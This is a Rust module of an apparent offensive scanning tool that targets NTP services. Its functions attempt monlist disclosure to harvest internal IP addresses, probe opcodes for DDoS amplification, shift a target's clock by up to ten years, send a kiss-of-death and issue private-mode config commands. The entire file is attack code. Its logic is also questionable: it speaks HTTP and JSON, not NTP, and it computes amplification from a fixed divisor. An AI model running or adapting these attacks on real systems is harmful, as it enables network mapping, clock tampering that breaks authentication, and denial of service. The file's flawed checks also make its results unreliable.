use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn monlist(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTP monlist Info Disclosure", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body = serde_json::json!({"action": "ntp_monlist", "host": url});

    match client.post(url).json(&body).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let text = resp.text().await.unwrap_or_default();
            let has_monlist = text.contains("monlist")
                || text.contains("address")
                || text.contains("client")
                || text.contains("remote");
            let tag = if has_monlist {
                "MONLIST EXPOSED".red().bold().to_string()
            } else {
                format!("status={}", status)
            };
            println!("  {} monlist request: {}", "*".cyan(), tag);

            let addr_re = regex::Regex::new(r"(\d{1,3}\.){3}\d{1,3}").ok();
            if let Some(re) = addr_re {
                let addrs: Vec<_> = re
                    .find_iter(&text)
                    .map(|m| m.as_str().to_string())
                    .collect();
                if !addrs.is_empty() {
                    println!(
                        "\n  {} Addresses in monlist (internal network leak):",
                        "[!]".red().bold()
                    );
                    let unique: std::collections::HashSet<_> = addrs.into_iter().collect();
                    for addr in &unique {
                        let internal = addr.starts_with("10.")
                            || addr.starts_with("192.168.")
                            || addr.starts_with("172.");
                        let tag = if internal {
                            "INTERNAL".red().to_string()
                        } else {
                            "external".to_string()
                        };
                        println!("    {} {:20} {}", "*".cyan(), addr, tag);
                    }
                    println!(
                        "\n  {} {} unique address(es) leaked — maps internal network.",
                        "[!]".red().bold(),
                        unique.len()
                    );
                }
            }
        }
        Err(_) => {
            println!("  {} monlist error", "*".red());
        }
    }
    Ok(())
}

pub async fn amplify(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTP Amplification Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let modes = [
        (
            "monlist (mode 7)",
            serde_json::json!({"action": "ntp_query", "mode": 7}),
        ),
        (
            "getmonlist (mode 6)",
            serde_json::json!({"action": "ntp_query", "mode": 6}),
        ),
        (
            "req_mon_list",
            serde_json::json!({"action": "ntp_query", "mode": 7, "opcode": 42}),
        ),
        (
            "req_peer_list",
            serde_json::json!({"action": "ntp_query", "mode": 6, "opcode": 1}),
        ),
        (
            "req_peer_list_summary",
            serde_json::json!({"action": "ntp_query", "mode": 6, "opcode": 6}),
        ),
    ];

    for (name, body) in &modes {
        let start = std::time::Instant::now();
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_size = resp.content_length().unwrap_or(0);
                let text = resp.text().await.unwrap_or_default();
                let _elapsed = start.elapsed();
                let actual_size = text.len() as u64;
                let amplification = if resp_size > 0 {
                    actual_size as f64 / 8.0
                } else {
                    0.0
                };
                let tag = if actual_size > 100 {
                    format!("{} bytes (amp ~{:.0}x)", actual_size, amplification)
                        .red()
                        .to_string()
                } else {
                    format!("status={} {} bytes", status, actual_size)
                };
                println!("  {} {:30} {}", "*".cyan(), name, tag);
            }
            Err(_) => {
                println!("  {} {:30} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} monlist can amplify traffic 500x+ — major DDoS vector.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn time(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTP Time Manipulation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let manipulations = [
        (
            "Set time +1 year",
            serde_json::json!({"action": "ntp_set_time", "offset": 31536000}),
        ),
        (
            "Set time -1 year",
            serde_json::json!({"action": "ntp_set_time", "offset": -31536000}),
        ),
        (
            "Set time +1 day",
            serde_json::json!({"action": "ntp_set_time", "offset": 86400}),
        ),
        (
            "Set time -1 day",
            serde_json::json!({"action": "ntp_set_time", "offset": -86400}),
        ),
        (
            "Set time +10 years",
            serde_json::json!({"action": "ntp_set_time", "offset": 315360000}),
        ),
        (
            "Time step",
            serde_json::json!({"action": "ntp_step_time", "offset": 3600}),
        ),
        (
            "Slew manipulation",
            serde_json::json!({"action": "ntp_slew", "rate": 1000}),
        ),
        ("Kiss of death", serde_json::json!({"action": "ntp_kod"})),
    ];

    for (name, body) in &manipulations {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let accepted =
                    text.contains("success") || text.contains("accepted") || status == 200;
                let tag = if accepted {
                    "ACCEPTED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:30} {}", "*".cyan(), name, tag);
            }
            Err(_) => {
                println!("  {} {:30} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} Time manipulation breaks Kerberos, cert validation, TOTP, and logging.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn peek(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} NTP Private Mode Commands", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let commands = [
        (
            "Read variables",
            serde_json::json!({"action": "ntp_private", "opcode": 2, "associd": 0}),
        ),
        (
            "Read clock variables",
            serde_json::json!({"action": "ntp_private", "opcode": 3, "associd": 0}),
        ),
        (
            "Read peers",
            serde_json::json!({"action": "ntp_private", "opcode": 1}),
        ),
        (
            "Read reset",
            serde_json::json!({"action": "ntp_private", "opcode": 5}),
        ),
        (
            "Read status",
            serde_json::json!({"action": "ntp_private", "opcode": 1, "associd": 0}),
        ),
        (
            "Config",
            serde_json::json!({"action": "ntp_private", "opcode": 8}),
        ),
        (
            "Save config",
            serde_json::json!({"action": "ntp_private", "opcode": 12}),
        ),
        (
            "Set trap",
            serde_json::json!({"action": "ntp_private", "opcode": 15}),
        ),
    ];

    for (name, body) in &commands {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let has_data = text.contains("version")
                    || text.contains("stratum")
                    || text.contains("refid")
                    || text.contains("peer")
                    || text.contains("config");
                let tag = if has_data {
                    "DATA EXTRACTED".red().bold().to_string()
                } else if status == 200 {
                    "accepted".to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:30} {}", "*".cyan(), name, tag);
            }
            Err(_) => {
                println!("  {} {:30} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} Private mode can expose NTP config, peers, and enable remote config.",
        "[*]".cyan().bold()
    );
    Ok(())
}
